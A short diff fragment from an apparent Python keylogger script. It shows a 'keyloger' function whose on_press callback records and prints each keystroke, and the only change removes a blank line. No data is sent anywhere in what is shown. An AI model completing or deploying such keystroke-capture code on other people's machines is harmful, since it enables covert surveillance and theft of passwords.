@@ -65,7 +65,6 @@ stoppingTime = time.time() + time_iteration
 def keyloger():
 
 
-
     def on_press(key):
             global keys, count, currentTime
             print(key)
